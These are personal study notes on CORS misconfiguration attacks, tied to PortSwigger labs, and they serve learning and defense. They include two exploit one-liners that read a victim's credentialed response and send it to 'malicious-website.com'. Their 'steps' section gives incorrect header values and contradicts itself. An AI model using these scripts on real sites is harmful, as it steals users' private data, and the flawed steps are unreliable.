# What is CORS (cross-origin resource sharing)?
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy SOP. this attack is all about allow or disallow browser to read the JS to read the response 
![[attack-on-cors.svg]]

`Access-Control-Allow-Origin: *` to allow any server to interact with me
`Access-Control-Allow-Credentials: true` if allow the me to read the user response while we he is logged in  

ACAO --> Which domains may read responses
ACAC --> Whether cookies/auth can be used

If a server returns `ACAO: *`  and `ACAC: true`, the browser will not expose the response to the requesting page’s JavaScript. In short: browsers treat that combination as invalid for credentialed responses and will block access.

# What is the same-origin policy?
The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain.

## why preflight exists
Browsers implement the Same-Origin Policy (SOP). Some cross-origin requests are **more risky** (they can change server state, send custom headers, or use non-standard methods). To protect users, browsers require an extra check — the **preflight** — for those requests so the server can explicitly say “I allow this particular cross-origin method/header/origin.”
## What triggers a preflight
A request becomes a _non-simple_ request and triggers preflight if any of these are true:
- HTTP method is not one of: `GET`, `HEAD`, `POST`.
- `POST` with `Content-Type` not equal to one of: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`.
- The request sets any custom headers other than the “CORS-safelisted request headers” (e.g., `Accept`, `Accept-Language`, `Content-Language`, `Content-Type` with safelisted values, `DPR`, `Save-Data`, etc.). If you add `X-My-Header` → preflight.
- The request uses `Fetch` `init` options that imply credentials in certain ways (but credentials alone don't always force preflight).
Simple summary: if it’s outside the small safe set → preflight.
## What the preflight `OPTIONS` request looks like (headers)
Browser sends an `OPTIONS` request with these headers:
- `Origin: https://attacker.com` — who is asking.
- `Access-Control-Request-Method: POST` — the method the _real_ request will use.
- `Access-Control-Request-Headers: x-api-key, x-custom` — (optional) a comma-separated list of headers the real request will include.
- (plus standard headers like `Host`, `User-Agent`, `Accept`)
Important: the preflight is lightweight — it doesn’t include cookies for cross-site if the cookie has SameSite that blocks it; however, browsers may send credentials on `OPTIONS` when `fetch` is used with `credentials: 'include'` — but the key decision is whether the server allows credentials (via `Access-Control-Allow-Credentials: true`).
## What a compliant server should return
Server answers the `OPTIONS` with CORS response headers that say what’s allowed:
- `Access-Control-Allow-Origin: https://attacker.com` (or specific origin)
- `Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT` — must include the method in the `Access-Control-Request-Method`.
- `Access-Control-Allow-Headers: X-Api-Key, X-Custom` — must include all requested headers (case-insensitive).
- OPTIONAL: `Access-Control-Allow-Credentials: true` — if server allows credentials.
- OPTIONAL: `Access-Control-Max-Age: 86400` — seconds browser can cache this preflight.
## Why NULL ?
Browsers might send the value `null` in the Origin header in various unusual situations:
- Some applications might whitelist the `null` origin to support local development of the application
- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.


##### script to exploit normal CORS misconfiguration
`var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='//malicious-website.com/log?key='+this.responseText; };`

##### script to exploit NULL CORS misconfiguration
`<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; req.send(); function reqListener() { location='malicious-website.com/log?key='+this.responseText; }; </script>"></iframe>`
*using a sandboxed `iframe` cross-origin request*

## Steps to make CORS misconfiguration happens
1. cookies must be sent if the website uses these headers `SameSite=Lax/Strict` this will not allow cookies to be sent over cross domains
2. server must respond with permissive CORS headers
	`Access-Control-Allow-Origin: *`
	`Access-Control-Allow-Credentials: <domain name>`
3. endpoint returning the sensitive secret in the response body
4. the response must be readable

## Labs
* #Portswigger
	1. **CORS vulnerability with basic origin reflection** #APPRENTICE 
		generate a code to retrieve the API token of the administrator *(trust any site)*
	2. **CORS vulnerability with trusted null origin** #APPRENTICE 
		generate a code to retrieve the API token of the administrator *(trust null origin)*
	3. **CORS vulnerability with trusted insecure protocols** #PRACTITIONER 
		this lab is applying CORS in right way but it trusts insecure protocols like HTTP so we found a subdomain that vulnerable to XSS and we exploit it and alert the API key to our server
# Common defenses against CORS-based attacks
- Proper configuration of cross-origin requests
- Only allow trusted sites
- Avoid whitelisting null
- CORS is not a substitute for server-side security policies

```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 90
  - item: "Browser"
    user: "Effective against the attack"
    score: 80
  - item: "Server"
    user: "Effective against the attack"
    score: 0
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 0

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```